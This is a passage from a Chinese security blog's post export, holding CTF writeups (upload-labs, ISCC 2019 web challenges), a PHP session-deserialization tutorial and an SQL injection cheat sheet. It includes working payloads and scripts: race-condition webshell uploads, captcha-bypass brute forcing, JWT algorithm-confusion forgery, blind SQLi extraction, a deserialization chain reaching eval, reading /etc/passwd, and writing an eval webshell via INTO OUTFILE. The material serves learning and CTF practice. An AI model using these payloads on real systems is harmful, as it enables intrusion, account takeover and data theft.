$file_ext = substr($file_name,strrpos($file_name,&quot;.&quot;)+1); $upload_file = UPLOAD_PATH . &#39;/&#39; . $file_name; if(move_uploaded_file($temp_file, $upload_file)){ if(in_array($file_ext,$ext_arr)){ $img_path = UPLOAD_PATH . &#39;/&#39;. rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext; rename($upload_file, $img_path); $is_upload = true; }else{ $msg = &quot;只允许上传.jpg|.png|.gif类型文件！&quot;; unlink($upload_file); } }else{ $msg = &#39;上传失败！&#39;; } } 可以看到文件先经过保存，然后判断后缀名是否在白名单中，如果不在则删除，此时可以利用条件竞争在保存文件后删除文件前来执行php文件。 一边用bp一直上传木马文件，一边用脚本一直访问该临时文件，就能成功执行命令。 Pass-18原理同17一样，都是利用条件竞争 Pass-19$is_upload = false; $msg = null; if (isset($_POST[&#39;submit&#39;])) { if (file_exists(UPLOAD_PATH)) { $deny_ext = array(&quot;php&quot;,&quot;php5&quot;,&quot;php4&quot;,&quot;php3&quot;,&quot;php2&quot;,&quot;html&quot;,&quot;htm&quot;,&quot;phtml&quot;,&quot;pht&quot;,&quot;jsp&quot;,&quot;jspa&quot;,&quot;jspx&quot;,&quot;jsw&quot;,&quot;jsv&quot;,&quot;jspf&quot;,&quot;jtml&quot;,&quot;asp&quot;,&quot;aspx&quot;,&quot;asa&quot;,&quot;asax&quot;,&quot;ascx&quot;,&quot;ashx&quot;,&quot;asmx&quot;,&quot;cer&quot;,&quot;swf&quot;,&quot;htaccess&quot;); $file_name = $_POST[&#39;save_name&#39;]; $file_ext = pathinfo($file_name,PATHINFO_EXTENSION); if(!in_array($file_ext,$deny_ext)) { $img_path = UPLOAD_PATH . &#39;/&#39; .$file_name; if (move_uploaded_file($_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;], $img_path)) { $is_upload = true; }else{ $msg = &#39;上传失败！&#39;; } }else{ $msg = &#39;禁止保存为该类型文件！&#39;; } } else { $msg = UPLOAD_PATH . &#39;文件夹不存在,请手工创建！&#39;; } } 这里需要注意的是move_uploaded_file会忽略掉文件末尾的/.这里是用户可控的。所以我们可以伪造这样的上传 总结感觉这个图总结的特别详细。 自己还是很菜，还要继续努力呀！","categories":[],"tags":[{"name":"web漏洞","slug":"web漏洞","permalink":"http://yoursite.com/tags/web漏洞/"}]},{"title":"2019ISCC wp","slug":"2019ISCC-wp","date":"2019-05-27T11:55:01.000Z","updated":"2019-05-29T12:42:23.268Z","comments":true,"path":"2019/05/27/2019ISCC-wp/","link":"","permalink":"http://yoursite.com/2019/05/27/2019ISCC-wp/","excerpt":"ISCC 2019 web前言这一段做了iscc的比赛题目，在此记录一下","text":"ISCC 2019 web前言这一段做了iscc的比赛题目，在此记录一下 webweb4地址：http://39.100.83.188:8066/打开题目：发现直接显示源码，于是审计一波： &lt;?php error_reporting(0); include(&quot;flag.php&quot;); $hashed_key = &#39;ddbafb4eb89e218701472d3f6c087fdf7119dfdd560f9d1fcbe7482b0feea05a&#39;; $parsed = parse_url($_SERVER[&#39;REQUEST_URI&#39;]); if(isset($parsed[&quot;query&quot;])){ $query = $parsed[&quot;query&quot;]; $parsed_query = parse_str($query); if($parsed_query!=NULL){ $action = $parsed_query[&#39;action&#39;]; } if($action===&quot;auth&quot;){ $key = $_GET[&quot;key&quot;]; $hashed_input = hash(&#39;sha256&#39;, $key); if($hashed_input!==$hashed_key){ die(&quot;&lt;img src=&#39;cxk.jpg&#39;&gt;&quot;); } echo $flag; } }else{ show_source(__FILE__); }?&gt; 代码审计一波：发现了当传入的参数中 action 为auth，并且key和hashed_key 相等时，就给出 flag。 但是通过关键代码的分析 发现了存在变量覆盖的可能 $parsed = parse_url($_SERVER[&#39;REQUEST_URI&#39;]); if(isset($parsed[&quot;query&quot;])){ $query = $parsed[&quot;query&quot;]; $parsed_query = parse_str($query); if($parsed_query!=NULL){ $action = $parsed_query[&#39;action&#39;]; } 函数parse_url和函数parse_str的配合使用可以实现变量覆盖 parse_url函数 parse_str函数作用 我们可以覆盖$hashed_key的值,为我们所控制的， &lt;?php $hashed_input = hash(&#39;sha256&#39;, &#39;chuddy&#39;); echo $hashed_input; ?&gt; 输出为：2b2714f1209077f1dc46756d01efd7610469b75c74182b5aa0126d50baaef96e 于是构建payload： http://39.100.83.188:8066/?action=auth&amp;hashed_key=2b2714f1209077f1dc46756d01efd7610469b75c74182b5aa0126d50baaef96e&amp;key=chuddy 就可以得到flag web2打开题目： 感觉像是暴力破解但是因为存在验证码，所以需要想办法绕过验证码的限制。 查看源码发现，该题目是通过php来写的验证码页面，猜测验证码的正确值可能会存在session当中。如果我们把session值删除，那么存在里面的验证码也就不存在了，再将传递的user_code的值设置为空就可以绕过验证码， 脚本： #coding=utf-8 import requests import sys reload(sys) sys.setdefaultencoding(&quot;utf8&quot;) data = { &#39;Cookie&#39;: &#39;&#39; } url=&#39;http://39.100.83.188:8002/login.php&#39; for x in xrange(0,10): for a in xrange(0,10): for i in xrange(0,10): data={ &#39;username&#39;:&#39;admin&#39;, &#39;pwd&#39;: str(x)+str(a)+str(i), &#39;user_code&#39;:&#39;&#39;, &#39;submit&#39;:&#39;submit&#39; } res=requests.post(url,data=data) print str(x)+str(a)+str(i) if &quot;å¯ç éè¯¯&quot; not in res.text: print str(x)+str(a)+str(i) print res.text break 得到flag 以及密码996 web1打开题目： &lt;?php error_reporting(0); require &#39;flag.php&#39;; $value = $_GET[&#39;value&#39;]; $password = $_GET[&#39;password&#39;]; $username = &#39;&#39;; for ($i = 0; $i &lt; count($value); ++$i) { if ($value[$i] &gt; 32 &amp;&amp; $value[$i] &lt; 127) unset($value); else $username .= chr($value[$i]); if ($username == &#39;w3lc0me_To_ISCC2019&#39; &amp;&amp; intval($password) &lt; 2333 &amp;&amp; intval($password + 1) &gt; 2333) { echo &#39;Hello &#39;.$username.&#39;!&#39;, &#39;&lt;br&gt;&#39;, PHP_EOL; echo $flag, &#39;&lt;hr&gt;&#39;; } } highlight_file(__FILE__); 代码审计一下：从get传参获取两个变量值value和password value为一个数组，其中里面只能为数组 如果在32和127之间就会被unset处理，其他的会转字符串存入用户名中，然后判断用户名是否为 w3lc0me_To_ISCC2019，再判断用 intval 之后的 password 是否小于 2333， intval 之后的 password + 1 是否大于 2333。 php的chr函数会对传入的值和256取模，于是我们可以传递一个比原来大256的数来进行绕过 可以写个脚本生成payload： stra = &#39;w3lc0me_To_ISCC2019&#39; j=0 value = [] for i in stra: value.append(ord(i)+256) str1 = &quot;&quot; for i in range(len(value)): str1 += &quot;value[&quot;+str(i)+&quot;]=&quot;+str(value[i])+&quot;&amp;&quot; print str1 value[0]=375&amp;value[1]=307&amp;value[2]=364&amp;value[3]=355&amp;value[4]=304&amp;value[5]=365&amp;value[6]=357&amp;value[7]=351&amp;value[8]=340&amp;value[9]=367&amp;value[10]=351&amp;value[11]=329&amp;value[12]=339&amp;value[13]=323&amp;value[14]=323&amp;value[15]=306&amp;value[16]=304&amp;value[17]=305&amp;value[18]=313 至于password参数可以对其进行16进制编码绕过或者科学记数法绕过。 最终payload为： http://39.100.83.188:8001/?value[0]=375&amp;value[1]=307&amp;value[2]=364&amp;value[3]=355&amp;value[4]=304&amp;value[5]=365&amp;value[6]=357&amp;value[7]=351&amp;value[8]=340&amp;value[9]=367&amp;value[10]=351&amp;value[11]=329&amp;value[12]=339&amp;value[13]=323&amp;value[14]=323&amp;value[15]=306&amp;value[16]=304&amp;value[17]=305&amp;value[18]=313&amp;password=1e9 即可得到flag。 web3sqli-labs上的一个原题利用到了二次注入。 打开页面发现需要注册账号进行登陆：于是随便注册一个账号登陆进去发现存在修改密码的功能，于是想到了二次注入。 注册一个用户名为admin&#39;--的账号登陆之后更改密码后台的sql语句可能为：update users set password=’1234561 where username=’admin’– ‘ 就可以修改管理员的账号密码了，进行登陆管理员的账号就得到了flag web6这是一道原题 参考了一叶飘零大佬写的文章文章地址 打开页面登陆进去，没什么思路，于是抓包看了一下： 发现了jwt的代码 eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiY2h1ZGR5IiwicHJpdiI6Im90aGVyIn0.VbwW1bhJ4555jrZw4PJeo1_h3QVQ3M0pUCeSkhu4Y6Z5JL8sSgVBL2Z6EeNDMBWBHy_Ps1WNPVeW1grFE4oH6n3dl7Qh8qsvFbqM3FMmNUwSaQhbjycLMVgHHwq2BbRG0qZoX9G8Fyr-uSLfxK9N18vOcKMirHpju0-qpVOR5gU 于是尝试解码： 通过查看源代码 发现/static/js/common.js后面有一段代码 function getpubkey(){ /* get the pubkey for test /pubkey/{md5(username+password)} */ } 尝试构造一个访问，查了我的用户名加密码的MD5值为：68c623464e8a37ddeb9632fb3ccbe82f 访问 /pubkey/68c623464e8a37ddeb9632fb3ccbe82f发现： 内容为： -----BEGIN PUBLIC KEY-----\\nMIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDMRTzM9ujkHmh42aXG0aHZk/PK\\nomh6laVF+c3+D+klIjXglj7+/wxnztnhyOZpYxdtk7FfpHa3Xh4Pkpd5VivwOu1h\\nKk3XQYZeMHov4kW0yuS+5RpFV1Q2gm/NWGY52EaQmpCNFQbGNigZhu95R2OoMtuc\\nIC+LX+9V/mpyKe9R3wIDAQAB\\n-----END PUBLIC KEY----- 将这个文件存入txt文件内： -----BEGIN PUBLIC KEY----- MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDMRTzM9ujkHmh42aXG0aHZk/PK omh6laVF+c3+D+klIjXglj7+/wxnztnhyOZpYxdtk7FfpHa3Xh4Pkpd5VivwOu1h Kk3XQYZeMHov4kW0yuS+5RpFV1Q2gm/NWGY52EaQmpCNFQbGNigZhu95R2OoMtuc IC+LX+9V/mpyKe9R3wIDAQAB -----END PUBLIC KEY----- 那么我们来尝试更改一下 alg 所指代的算法，将其从 RS256 这种非对称加密改成 HS256 这种对称加密，这样我们有公钥就可以伪造 JWT Token 从而为所欲为了。用 Python 脚本来伪造令牌，payload 部分填写自己想要的内容。 import jwt import base64 public = open(&#39;2.txt&#39;, &#39;r&#39;).read() print jwt.encode({&quot;name&quot;: &quot;chuddy&quot;,&quot;priv&quot;: &quot;admin&quot;}, key=public, algorithm=&#39;HS256&#39;) 运行发现报错了。直接去库源码里面把报错的那一段注释掉。简单粗暴 再次运行就会得到JWT TOKEN了 然后抓包更改session： 得到了admin的留言地址，访问就会得到flag web5打开链接发现： 猜测是修改header头来进行绕过的，经过尝试发现添加 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0Union.373 提示我要输入用户名：于是post传递username=chuddy 又提示我需要输入密码：于是post传递password=chuddy 得到 通过尝试得到了用户名union_373_Tom 这道题过滤了好多敏感字符串，尝试了一下发现可以通过order by注入得到密码 当传递的参数为： username=union_373_Tom&#39;/*&amp;password=*/ union select 1,2,&#39;1&#39; order by 3,2,&#39;1 返回为： 组织欢迎你，2! 当传递的参数为： username=union_373_Tom&#39;/*&amp;password=*/ union select 1,2,&#39;2&#39; order by 3,2,&#39;1 返回为： 组织欢迎你，union_373_Tom! 于是可以尝试使用脚本来跑： #coding=utf-8 import requests head = { &#39;User-Agent&#39;: &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0Union.373&#39; } url=&#39;http://39.100.83.188:8054/&#39; # res=requests.post(url,headers=data) # print res.content password = &quot;&quot; for i in range(10): for j in range(33,128): data={ &#39;username&#39;:&quot;union_373_Tom&#39;/*&quot;, &#39;password&#39;: &quot;*/ union select 1,2,\\&quot;&quot;+password+chr(j)+&quot;\\&quot; order by 3,2,&#39;1&quot; } print j res=requests.post(url,data=data,headers=head) # print res.content if &#39;union_373_Tom&#39; in res.content: password += chr(j-1) print password break 即可得到密码，就是flag 感觉这次iscc的题目不是特别难，而且还有好多原题，感觉自己还是很菜。","categories":[],"tags":[{"name":"writeup","slug":"writeup","permalink":"http://yoursite.com/tags/writeup/"}]},{"title":"session 反序列化","slug":"session-反序列化","date":"2019-05-14T10:49:02.000Z","updated":"2019-05-29T12:32:11.053Z","comments":true,"path":"2019/05/14/session-反序列化/","link":"","permalink":"http://yoursite.com/2019/05/14/session-反序列化/","excerpt":"session-反序列化前言通过一道ctf题，感觉自己对php session 反序列化的认识并不深刻，所以想要再次总结一下","text":"session-反序列化前言通过一道ctf题，感觉自己对php session 反序列化的认识并不深刻，所以想要再次总结一下 简介在php.ini中存在几项配置项： session.save_path=&quot;&quot; --设置session的存储路径 session.save_handler=&quot;&quot; --设定用户自定义存储函数，如果想使用PHP内置会话存储机制之外的可以使用本函数(数据库等方式) session.auto_start boolen --指定会话模块是否在请求开始时启动一个会话,默认为0不启动 session.serialize_handler string --定义用来序列化/反序列化的处理器名字。默认使用php 以上的选项就是与PHP中的Session存储和序列话存储有关的选项。 在使用xampp组件安装中，上述的配置项的设置如下： session.save_path=&quot;D:\\xampp\\tmp&quot; 表明所有的session文件都是存储在xampp/tmp下 session.save_handler=files 表明session是以文件的方式来进行存储的 session.auto_start=0 表明默认不启动session session.serialize_handler=php 表明session的默认序列话引擎使用的是php序列话引擎 在上述的配置中，session.serialize_handler是用来设置session的序列话引擎的，除了默认的PHP引擎之外，还存在其他引擎，不同的引擎所对应的session的存储方式不相同。 php_binary:存储方式是，键名的长度对应的ASCII字符+键名+经过serialize()函数序列化处理的值 php:存储方式是，键名+竖线+经过serialize()函数序列处理的值 php_serialize(php&gt;5.5.4):存储方式是，经过serialize()函数序列化处理的值 默认引擎为PHP引擎, 可以添加代码ini_set(&#39;session.serialize_handler&#39;, &#39;需要设置的引擎&#39;); session 存储机制php中的session的内容并不是放在内存中的，二十以文件的方式来存储的，存储方式就是有配置项session.sace_handler来进行确定的,默认是以文件的方式存储。 存储文件都是以sess_sessionid来进行命名的，文件的内容就是session值的序列化之后的内容 不同版本的引擎 保存的文件也不同同样存储$_SESSION[&#39;chuddy&#39;]=、&quot;chuddy123&quot;;这样的一个session ini_set(&#39;session.serialize_handler&#39;, &#39;php_serialize&#39;); a:1:{s:6:&quot;chuddy&quot;;s:9:&quot;chuddy123&quot;;} ini_set(&#39;session.serialize_handler&#39;, &#39;php&#39;); chuddy|s:9:&quot;chuddy123&quot;; ini_set(&#39;session.serialize_handler&#39;, &#39;php_binary&#39;); \u0006chuddys:9:&quot;chuddy123&quot;; 由于`chuddy`的长度是6，6在ASCII表中对应的就是&lt;0x06&gt;。 根据php_binary的存储规则，最后就是\u0006chuddys:9:&quot;chuddy123&quot;; PHP Session中的序列化的危害PHP中的Session的实现是没有的问题，危害主要是由于程序员的Session使用不当而引起的。 如果在PHP在反序列化存储的$_SESSION数据时使用的引擎和序列化使用的引擎不一样，会导致数据无法正确第反序列化。通过精心构造的数据包，就可以绕过程序的验证或者是执行一些系统的方法。 例如： $_SESSION[&#39;chuddy&#39;] = &#39;|O:11:&quot;chuddyClass&quot;:0:{}&#39;; 上述的$_SESSION数据使用php_serialize，那么最后的存储的内容就是a:1:{s:6:&quot;chuddy&quot;;s:24:&quot;|O:11:&quot;chuddyClass&quot;:0:{}&quot;;}。 但是当我们进行读取的时候，选择的是php，那么最后读取的内容就会发生改变的当使用php引擎的时候，php引擎会以|作为key和value的分隔符，那么就会将a:1:{s:6:&quot;chuddy&quot;;s:24:&quot;作为SESSION的key值，将O:11:&quot;chuddyClass&quot;:0:{}&quot;;}作为SESSION的value值，然后进行反序列化，最后会得到chuddyClass这个类 这种由于序列话化和反序列化所使用的不一样的引擎就是造成PHP Session序列话漏洞的原因。 实际利用存在session1.php和session2.php着这两个文件 session1.php &lt;?php ini_set(&#39;session.serialize_handler&#39;,&#39;php_serialize&#39;); echo @$_GET[&#39;chuddy&#39;]; session_start(); $_SESSION[&#39;chuddy&#39;] = @$_GET[&#39;chuddy&#39;]; ?&gt; session2.php &lt;?php ini_set(&#39;session.serialize_handler&#39;,&#39;php&#39;); session_start(); var_dump($_SESSION); class chuddy{ function __destruct(){ echo phpinfo(); } } ?&gt; 当访问session1.php时 提交一下数据： session1.php?chuddy=|O:6:%22chuddy%22:0:{} 此时传入的数据会按照php_serialize来进行序列化存储 然后去访问session2.php,页面会输出phpinfo()函数，说明成功执行了我们构造的函数。 是因为在访问session2.php时，程序会按照php引擎来解析，SESSION中的数据，此时就会反序列化伪造的数据，就会实例化一个chuddy对象，最后就会执行析构函数中的phpinfo() CTF例题安恒月赛的一道 反序列化题目： 环境配置： php版本&gt;5.5.4 #php.ini部分相关配置 session.auto_start=Off session.serialize_handler=php_serialize session.upload_progress.cleanup=Off session.upload_progress.enabled=On 主要给出了几个文件的源码： class.php &lt;?php highlight_string(file_get_contents(basename($_SERVER[&#39;PHP_SELF&#39;]))); //show_source(__FILE__); class foo1{ public $varr; function __construct(){ $this-&gt;varr = &quot;index.php&quot;; } function __destruct(){ if(file_exists($this-&gt;varr)){ echo &quot;&lt;br&gt;文件&quot;.$this-&gt;varr.&quot;存在&lt;br&gt;&quot;; } echo &quot;&lt;br&gt;这是foo1的析构函数&lt;br&gt;&quot;; } } class foo2{ public $varr; public $obj; function __construct(){ $this-&gt;varr = &#39;1234567890&#39;; $this-&gt;obj = null; } function __toString(){ $this-&gt;obj-&gt;execute(); return $this-&gt;varr; } function __desctuct(){ echo &quot;&lt;br&gt;这是foo2的析构函数&lt;br&gt;&quot;; } } class foo3{ public $varr; function execute(){ eval($this-&gt;varr); } function __desctuct(){ echo &quot;&lt;br&gt;这是foo3的析构函数&lt;br&gt;&quot;; } } ?&gt; index.php &lt;?php ini_set(&#39;session.serialize_handler&#39;, &#39;php&#39;); require(&quot;./class.php&quot;); session_start(); $obj = new foo1(); $obj-&gt;varr = &quot;phpinfo.php&quot;; ?&gt; phpinfo.php &lt;?php session_start(); require(&quot;./class.php&quot;); $f3 = new foo3(); $f3-&gt;varr = &quot;phpinfo();&quot;; $f3-&gt;execute(); ?&gt; 通过代码 发现了危险函数eval 可以想到利用php session 反序列化来进行构造自己想要的 访问phpinfo.php 发现[]可以看到一些敏感的配置信息，也找到一下比较有用的信息 session.upload_progress.enabled，当它为开启状态时，PHP能够在每一个文件上传时监测上传进度。 当一个上传在处理中，同时POST一个与php.ini中设置的session.upload_progress.name同名变量时，上传进度就可以在$_SESSION中获得。 当PHP检测到这种POST请求时，它会在$_SESSION中添加一组数据, 索引是session.upload_progress.prefix与 session.upload_progress.name连接在一起的值。 a:1:{s:19:&quot;upload_progress_123&quot;;a:5:{s:10:&quot;start_time&quot;;i:1558005301;s:14:&quot;content_length&quot;;i:471;s:15:&quot;bytes_processed&quot;;i:471;s:4:&quot;done&quot;;b:1;s:5:&quot;files&quot;;a:1:{i:0;a:7:{s:10:&quot;field_name&quot;;s:4:&quot;file&quot;;s:4:&quot;name&quot;;s:139:&quot;|O:4:&quot;foo1&quot;:1:{s:4:&quot;varr&quot;;O:4:&quot;foo2&quot;:2:{s:4:&quot;varr&quot;;s:10:&quot;1234567890&quot;;s:3:&quot;obj&quot;;O:4:&quot;foo3&quot;:1:{s:4:&quot;varr&quot;;s:24:&quot;var_dump(scandir(&quot;./&quot;));&quot;;}}} 测试一下 构造一个可以实现我们想要的功能的本地测试的代码： &lt;?php class foo3{ public $varr=&#39;var_dump(scandir(&quot;./&quot;));&#39;; function execute(){ eval($this-&gt;varr); } } class foo2{ public $varr; public $obj; function __construct(){ $this-&gt;varr = &#39;1234567890&#39;; $this-&gt;obj = new foo3(); } function __toString(){ $this-&gt;obj-&gt;execute(); return $this-&gt;varr; } } class foo1{ public $varr; function __construct(){ $this-&gt;varr = new foo2(); } } $obj = new foo1(); print_r(serialize($obj)); ?&gt; 在foo1中的构造函数中定义varr的值为foo2的实例，在foo2中定义obj为foo3的实例，在foo3中定义$varr的值var_dump(scandir(‘./‘)); 输出了序列化后的类 O:4:&quot;foo1&quot;:1:{s:4:&quot;varr&quot;;O:4:&quot;foo2&quot;:2:{s:4:&quot;varr&quot;;s:10:&quot;1234567890&quot;;s:3:&quot;obj&quot;;O:4:&quot;foo3&quot;:1:{s:4:&quot;varr&quot;;s:24:&quot;var_dump(scandir(&quot;./&quot;));&quot;;}}} 然后通过上面讲的将这个类存入session文件中: &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;title&gt;test&lt;/title&gt; &lt;meta charset=&quot;utf-8&quot;&gt; &lt;/head&gt; &lt;body&gt; &lt;form action=&quot;./index.php&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value=&quot;123&quot; /&gt; &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt; &lt;input type=&quot;submit&quot; value=&quot;go&quot; /&gt; &lt;/form&gt; &lt;/body&gt; &lt;/html&gt; 然后抓包修改相应的内容： [] 然后修改相应的参数 就可以找到 flag文件 并读取出来；这就不一一细说了。 总结感觉自己还是特别菜 好多还不会 希望能够静下心来 好好学","categories":[],"tags":[{"name":"web漏洞","slug":"web漏洞","permalink":"http://yoursite.com/tags/web漏洞/"}]},{"title":"sql注入","slug":"sql注入","date":"2019-05-02T08:31:07.000Z","updated":"2019-05-29T12:32:11.717Z","comments":true,"path":"2019/05/02/sql注入/","link":"","permalink":"http://yoursite.com/2019/05/02/sql注入/","excerpt":"sql注入漏洞前言感觉自己以前学的比较粗糙，这一段打算逐一把学过的漏洞再重新学习一边，加深一下印象。","text":"sql注入漏洞前言感觉自己以前学的比较粗糙，这一段打算逐一把学过的漏洞再重新学习一边，加深一下印象。 sql注入简介Sql 注入攻击是通过将恶意的 Sql 查询或添加语句插入到应用的输入参数中，再在后台 Sql 服务器上解析执行进行的攻击，它目前黑客对数据库进行攻击的最常用手段之一。 mysql数据库的知识储备mysql数据库中的一些全局变量 user() 当前用户 version() 数据库版本 database() 当前数据库名 @@version_compile_os 当前的操作系统 数据库中常见的注释符： 1. -- 后面有一个空格 2. /*...*/ 3. # 在MySQL中有一个叫做information_schema的库，它存储着所有表的信息 虽然里面有这么多的表，常用的不是特别多 schemata、TABLES、COLUMNS schemata表，这个便存储了mysql数据库的所有库名 tables表里面包含了数据库中的所有的表名 COLUMNS表中存储了所有表的字段信息 一些常用的查找语句 所有用户 select group_concat(user) from mysql.user 用户hash: select group_concat(password) from mysql.user where user=&#39;root&#39; 所有数据库： select group_concat(schema_name) from information_schema.schemata 表名： select group_concat(table_name) from information_schema.tables where table_schema=&#39;库名&#39; //表中有主码约束，非空约束等完整性约束条件的才能用这个语句查询出来 select group_concat(table_name) from information_schema.table_constraints where table_schema=&#39;库名&#39; 字段名： select group_concat(column_name) from information_schema.columns where table_name=&#39;表名&#39; 读文件： select load_file(&#39;/etc/passwd&#39;) 写文件： select &lt;?php @eval($_POST[&#39;a&#39;]); ?&gt; into outfile &#39;/var/www/html/shell.php&#39; 常见的sql注入类型union注入联合注入也是常见一种注入方式，利用条件页面需要有回显位。 猜字段的长度页面有回显的情况下可以通过：order by 来猜测字段的长度 id=1&#39; order by 3-- 猜字段的位置如果已经知道字段的长度为3的话可以通过联合查询来爆出字段的位置 id=-1&#39; union select 1,2,3-- 基本语法union select 1,flag,3 from flag 过滤了逗号的联合注入mysql&gt; select * from user1 where id=-1 union select * from (select version())a join (select database())b join (select database())c; +--------+------+------+ | id | name | pass | +--------+------+------+ | 5.5.53 | test | test | +--------+------+------+ 1 row in set (0.04 sec) 报错注入mysql数据库的报错注入方法整理， floor UpdateXml ExtractValue NAME_CONST Error based Double Query Injection … floor?id=1 OR (SELECT 8627 FROM(SELECT COUNT(*),CONCAT(0x6368756464797e,(SELECT user()),0x7e636875646479,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) 操作： mysql&gt; select * from user where id=1 OR (SELECT 8627 FROM(SELECT COUNT(*),CONCAT(0x6368756464797e,(SELECT user()),0x7e636875646479,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a); ERROR 1062 (23000): Duplicate entry &#39;chuddy~root@localhost~chuddy1&#39; for key &#39;group_key&#39; ExtractValue(有长度限制,最长32位)?id=1 and extractvalue(1, concat(0x7e, (select @@version),0x7e)) mysql&gt; select * from user where 1 and extractvalue(1, concat(0x7e, (select @@version),0x7e)); ERROR 1105 (HY000): XPATH syntax error: &#39;~5.5.53~&#39; 当查询的书库超过32位 可以利用字符串截取函数，多次读取该数据 UpdateXml(有长度限制,最长32位)?id=1 and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1) 利用方式和ExtractValue方式差不多，当查询的书库超过32位 可以利用字符串截取函数，多次读取该数据 NAME_CONST(适用于低版本，不太好用)?id=261 and 1=(select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1)) as x) Error based Double Query Injection?id=1 or 1 group by concat_ws(0x7e,version(),floor(rand(0)*2)) having min(0) or 1 exp(5.5.5以上)?id=1 and (select exp(~(select * from(select user())x))) polygonmysql&gt; select * from user where name = &quot;&quot; and polygon(pass); ERROR 1367 (22007): Illegal non geometric &#39;`test`.`user`.`pass`&#39; value found during parsing 布尔盲注基本语法 id = 1 and ascii(substr((select database()),1,1))&gt;97--+ 由于Mysql4之后对大小写就不敏感，可以使用binary()函数使大小写敏感。 构造布尔条件的骚姿势//正常情况 &#39;or bool# true&#39;and bool# //不使用空格、注释 &#39;or(bool)=&#39;1 true&#39;and(bool)=&#39;1 //不使用or、and、注释 &#39;^!(bool)=&#39;1 &#39;=(bool)=&#39; &#39;||(bool)=&#39;1 true&#39;%26%26(bool)=&#39;1 //%26就是&amp; &#39;=if((bool),1,0)=&#39;0 &#39;-(bool)-&#39; &#39;^(bool)^&#39; //不使用等号、空格、注释 &#39;or(bool)&lt;&gt;&#39;0 &#39;or((bool)in(1))or&#39;0 //其他 or (case when (bool) then 1 else 0 end) 构造逻辑判断常见的逻辑判断函数 字符串的截取函数： left(user(),1)&gt;&#39;c&#39; right(user(),1)&gt;&#39;c&#39; substr(user(),1,1)&gt;&#39;c&#39; mid(user(),1,1)=&#39;c&#39; 查询字符串的长度: length(&#39;chuddy&#39;) 查询字符的ascii码： ord(&#39;a&#39;) ascii(&#39;a&#39;) ascii转换字符: char(97) 布尔盲注的基本语法： ascii(substr((查询的sql语句),1,1))&gt;97 一些绕过方式 过滤了空格可以一下代替 /*1*/ %20 %a0 过滤了 = like &lt;&gt; regexp 过滤了一些关键词 可以大小写绕过 unIon、seLect、 如果关键词被替换位空白 可以双写绕过 selselectect、 uniunionon 特殊的盲注方法: 利用order by 盲注 ----+----------+----------------------------------+ | id | username | password | +----+----------+----------------------------------+ | 1 | 2 | 5 | | 1 | admin | 51b7a76d51e70b419f60d3473fb6f900 | +----+----------+----------------------------------+ 2 rows in set (0.00 sec) mysql&gt; select * from admin where username=&#39;&#39; or 1 union select 1,2,&#39;6&#39; order by 3; +----+----------+----------------------------------+ | id | username | password | +----+----------+----------------------------------+ | 1 | admin | 51b7a76d51e70b419f60d3473fb6f900 | | 1 | 2 | 6 | +----+----------+----------------------------------+ 2 rows in set (0.01 sec) 过滤很严格的话 可以通过一些其他它方式爆破密码 mysql&gt; select * from user1 where name=&quot;user4&quot; &amp;&amp; pass&gt;&#39;a1&#39;; +------+-------+--------+ | id | name | pass | +------+-------+--------+ | 4 | user4 | a1b2c3 | +------+-------+--------+ 1 row in set (0.00 sec) mysql&gt; select * from user1 where name=&quot;user4&quot; &amp;&amp; pass&gt;&#39;a2&#39;; Empty set (0.00 sec) 跨表查询数据 mysql&gt; select * from user1 where id =1 and (select a.pass&lt;&#39;7&#39; from user a limit 1); +------+-------+------+ | id | name | pass | +------+-------+------+ | 1 | user1 | 123 | +------+-------+------+ 1 row in set (0.00 sec) mysql&gt; select * from user1 where id =1 and (select a.pass&gt;&#39;7&#39; from user a limit 1); Empty set (0.00 sec) 延时注入相交于bool盲注，就是把返回值0和1改为是否延时的标准，一般格式为：if((bool),sleep(5),0)和or (case when (bool) then sleep(5) else 0 end) 延时函数： BENCHMARK(100000,MD5(1)) sleep BENCHMARK()用于测试函数的性能，参数一为次数，二为要执行的表达式。可以让函数执行若干次，返回结果比平时要长，通过时间长短的变化，判断语句是否执行成功。这是一种边信道攻击，在运行过程中占用大量的cpu资源。推荐使用sleep() 如果着两个函数被ban了可以利用笛卡儿积造成延迟来进行注入 &#39; and if(ascii(substr((select database()),%d,1))&lt;%d,(SELECT count(*) FROM information_schema.columns A, information_schema.columns B,information_schema.tables C),1)# insert和uodate注入//insert 的报错注入 mysql&gt; insert into user2 values(null,&#39;a&#39; and extractvalue(1, concat(0x7e, (select @@version),0x7e))); ERROR 1105 (HY000): XPATH syntax error: &#39;~5.5.53~&#39; mysql&gt; insert into user2 values(null,&#39;a&#39; and extractvalue(1, concat(0x7e, (select database()),0x7e))); ERROR 1105 (HY000): XPATH syntax error: &#39;~y1~&#39; //update的报错注入 mysql&gt; update user2 set name=&#39;a&#39; where pass=&#39;a&#39; and extractvalue(1, concat(0x7e, (select @@version),0x7e)); ERROR 1105 (HY000): XPATH syntax error: &#39;~5.5.53~&#39; mysql&gt; update user2 set name=&#39;a&#39; where pass=&#39;a&#39; and extractvalue(1, concat(0x7e, (select database()),0x7e)); ERROR 1105 (HY000): XPATH syntax error: &#39;~y1~&#39; //insert 延时注入 database为y1 mysql&gt; insert into user2(name,pass) values(&#39;a&#39;, mid((select database()),1,1)=&quot;1&quot; or sleep(3)); Query OK, 1 row affected (3.00 sec) mysql&gt; insert into user2(name,pass) values(&#39;a&#39;, mid((select database()),1,1)=&quot;y&quot; or sleep(3)); Query OK, 1 row affected (0.00 sec) 